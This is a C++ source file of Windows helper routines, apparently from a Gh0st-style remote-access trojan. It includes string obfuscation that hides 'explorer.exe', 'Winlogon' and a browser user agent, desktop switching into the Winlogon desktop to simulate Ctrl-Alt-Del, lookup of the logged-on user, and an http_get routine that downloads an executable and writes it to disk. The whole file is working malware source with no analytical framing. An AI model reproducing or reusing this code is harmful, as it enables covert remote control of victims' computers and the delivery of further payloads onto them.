
#include "..\pch.h"
#if !defined(AFX_UNTIL_CPP_INCLUDED)
#define AFX_UNTIL_CPP_INCLUDED


#include <windows.h>
#include <process.h>
#include <Tlhelp32.h>
#include <Wtsapi32.h>
#include <wininet.h>
#pragma comment(lib, "Wtsapi32.lib")
#include "until.h"
#include <string.h>
#include <stdio.h>
#include <locale.h>
#include <stdlib.h>
#include "..\StrCry.h"
unsigned int __stdcall ThreadLoader(LPVOID param)
{
	unsigned int	nRet = 0;
#ifdef _DLL
 	try
 	{
#endif	
		THREAD_ARGLIST	arg;
		memcpy(&arg, param, sizeof(arg));
		SetEvent(arg.hEventTransferArg);
		// 与桌面交互
		if (arg.bInteractive)
			SelectDesktop(NULL);

		nRet = arg.start_address(arg.arglist);
#ifdef _DLL
	}catch(...){};
#endif
	return nRet;
}

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId, bool bInteractive)
{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	arg;
	arg.start_address = (unsigned ( __stdcall *)( void * ))lpStartAddress;
	arg.arglist = (void *)lpParameter;
	arg.bInteractive = bInteractive;
	arg.hEventTransferArg = CreateEvent(NULL, false, false, NULL);
	hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);
	WaitForSingleObject(arg.hEventTransferArg, INFINITE);
	CloseHandle(arg.hEventTransferArg);
	
	return hThread;
}

DWORD GetProcessID(LPCTSTR lpProcessName)
{
	DWORD RetProcessID = 0;
	HANDLE handle=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32* info=new PROCESSENTRY32;
	info->dwSize=sizeof(PROCESSENTRY32);
	
	if(Process32First(handle,info))
	{
		if (strcmpi(info->szExeFile,lpProcessName) == 0)
		{
			RetProcessID = info->th32ProcessID;
			return RetProcessID;
		}
		while(Process32Next(handle,info) != FALSE)
		{
			if (lstrcmpi(info->szExeFile,lpProcessName) == 0)
			{
				RetProcessID = info->th32ProcessID;
				return RetProcessID;
			}
		}
	}
	return RetProcessID;
}

char *GetLogUserXP()
{
	TCHAR	*szLogName = NULL;
	DWORD	dwSize = 0;
	if (WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, WTS_CURRENT_SESSION, WTSUserName, &szLogName, &dwSize))
	{
		char	*lpUser = new char[256];
		lstrcpy(lpUser, szLogName);
		WTSFreeMemory(szLogName);
		return lpUser;
	}
	else
		return NULL;
}

char *GetLogUser2K()
{
	char explorer[] = { 0x0c,0xae,0xb2,0xb9,0xa4,0xa8,0xb4,0xa0,0xb6,0xed,0xa7,0xb9,0xa5 };	//explorer.exe
	char* explorer_exe = decodeStr(explorer);					//解密函数

	DWORD	dwProcessID = GetProcessID(explorer_exe);
	memset(explorer_exe, 0, explorer[STR_CRY_LENGTH]);					//填充0
	delete explorer_exe;

	if (dwProcessID == 0)
		return NULL;
	
	BOOL fResult  = FALSE;
    HANDLE hProc  = NULL;
	HANDLE hToken = NULL;
	TOKEN_USER *pTokenUser = NULL;
	char	*lpUserName = NULL;
	__try
	{
        // Open the process with PROCESS_QUERY_INFORMATION access
        hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
        if (hProc == NULL)
		{
			__leave;
		}
        fResult = OpenProcessToken(hProc, TOKEN_QUERY, &hToken);
        if(!fResult)  
		{
			__leave;
		}
		
		DWORD dwNeedLen = 0;		
		fResult = GetTokenInformation(hToken,TokenUser, NULL, 0, &dwNeedLen);
		if (dwNeedLen > 0)
		{
			pTokenUser = (TOKEN_USER*)new BYTE[dwNeedLen];
			fResult = GetTokenInformation(hToken,TokenUser, pTokenUser, dwNeedLen, &dwNeedLen);
			if (!fResult)
			{
				__leave;
			}
		}
		else
		{
			__leave;
		}
		
		SID_NAME_USE sn;
		TCHAR szDomainName[MAX_PATH];
		DWORD dwDmLen = MAX_PATH;
		
		DWORD	nNameLen = 256;
		lpUserName = new char[256];
		
		fResult = LookupAccountSid(NULL, pTokenUser->User.Sid, lpUserName, &nNameLen,
			szDomainName, &dwDmLen, &sn);
	}
	__finally
	{
		if (hProc)
			::CloseHandle(hProc);
		if (hToken)
			::CloseHandle(hToken);
		if (pTokenUser)
			delete[] (char*)pTokenUser;
		
		return lpUserName;
	}
}

char *GetCurrentLoginUser()
{
	OSVERSIONINFOEX    OsVerInfo;
	ZeroMemory(&OsVerInfo, sizeof(OSVERSIONINFOEX));
	OsVerInfo.dwOSVersionInfoSize=sizeof(OSVERSIONINFOEX);
	if(!GetVersionEx((OSVERSIONINFO *)&OsVerInfo))
	{
		OsVerInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		if(!GetVersionEx((OSVERSIONINFO *)&OsVerInfo))
			return NULL;
	}
	
	if(OsVerInfo.dwMajorVersion == 5 && OsVerInfo.dwMinorVersion == 0)
		return GetLogUser2K();
	else
		return GetLogUserXP();
	
}

bool SwitchInputDesktop()
{
 	BOOL	bRet = false;
 	DWORD	dwLengthNeeded;

	HDESK	hOldDesktop, hNewDesktop;
	char	strCurrentDesktop[256], strInputDesktop[256];

	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded);


	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(strInputDesktop, 0, sizeof(strInputDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);

	if (lstrcmpi(strInputDesktop, strCurrentDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	CloseDesktop(hOldDesktop);

	CloseDesktop(hNewDesktop);


	return bRet;
}

BOOL SelectHDESK(HDESK new_desktop)
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());
	
	DWORD dummy;
	char new_name[256];
	
	if (!GetUserObjectInformation(new_desktop, UOI_NAME, &new_name, 256, &dummy)) {
		return FALSE;
	}
	
	// Switch the desktop
	if(!SetThreadDesktop(new_desktop)) {
		return FALSE;
	}
	
	// Switched successfully - destroy the old desktop
	CloseDesktop(old_desktop);
	
	return TRUE;
}

// - SelectDesktop(char *)
// Switches the current thread into a different desktop, by name
// Calling with a valid desktop name will place the thread in that desktop.
// Calling with a NULL name will place the thread in the current input desktop.

BOOL SelectDesktop(char *name)
{
	HDESK desktop;
	
	if (name != NULL)
	{
		// Attempt to open the named desktop
		desktop = OpenDesktop(name, 0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
	}
	else
	{
		// No, so open the input desktop
		desktop = OpenInputDesktop(0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
	}
	
	// Did we succeed?
	if (desktop == NULL) {
		return FALSE;
	}
	
	// Switch to the new desktop
	if (!SelectHDESK(desktop)) {
		// Failed to enter the new desktop, so free it!
		CloseDesktop(desktop);
		return FALSE;
	}
	
	// We successfully switched desktops!
	return TRUE;
}

BOOL SimulateCtrlAltDel()
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());
	
	// Switch into the Winlogon desktop

	char Winlogon[] = { 0x08,0x9c,0xa3,0xa7,0xa4,0xa8,0xa1,0xaa,0xaa };	//Winlogon
	char* pWinlogon = decodeStr(Winlogon);								//解密函数

	//char name[] = "Winlogon";
	if (!SelectDesktop(pWinlogon))
	{
		return FALSE;
	}
	memset(pWinlogon, 0, Winlogon[STR_CRY_LENGTH]);					//填充0
	delete pWinlogon;
	
	// Fake a hotkey event to any windows we find there.... :(
	// Winlogon uses hotkeys to trap Ctrl-Alt-Del...
	PostMessage(HWND_BROADCAST, WM_HOTKEY, 0, MAKELONG(MOD_ALT | MOD_CONTROL, VK_DELETE));
	
	// Switch back to our original desktop
	if (old_desktop != NULL)
		SelectHDESK(old_desktop);
	
	return TRUE;
}
bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
	HINTERNET	hInternet, hUrl;
	HANDLE		hFile;
	char		buffer[1024];
	DWORD		dwBytesRead = 0;
	DWORD		dwBytesWritten = 0;
	BOOL		bIsFirstPacket = true;
	BOOL		bRet = true;

	//strcry
	char Mozilla[] = { 0x18,0x86,0xa5,0xb3,0xa1,0xab,0xaa,0xa4,0xeb,0xf7,0xec,0xf1,0xe0,0x97,0xdd,0xd2,0xd1,0xcb,0xdb,0xcd,0xd1,0xd5,0xda,0xd0,0x9d };	//Mozilla/4.0 (compatible)
	char* pMozilla = decodeStr(Mozilla);					//解密函数

	hInternet = InternetOpen(pMozilla, INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);

	memset(pMozilla, 0, pMozilla[STR_CRY_LENGTH]);					//填充0
	delete pMozilla;
	
	if (hInternet == NULL)
		return false;
	
	hUrl = InternetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (hUrl == NULL)
		return false;
	
	hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			memset(buffer, 0, sizeof(buffer));
			InternetReadFile(hUrl, buffer, sizeof(buffer), &dwBytesRead);
			// 由判断第一个数据包是不是有效的PE文件
			if (bIsFirstPacket && ((PIMAGE_DOS_HEADER)buffer)->e_magic != IMAGE_DOS_SIGNATURE)
			{
				bRet = false;
				break;
			}
			bIsFirstPacket = false;
			
			WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
		} while(dwBytesRead > 0);
		CloseHandle(hFile);
	}
	
	InternetCloseHandle(hUrl);
	InternetCloseHandle(hInternet);
	
	return bRet;
}

#endif // !defined(AFX_UNTIL_CPP_INCLUDED)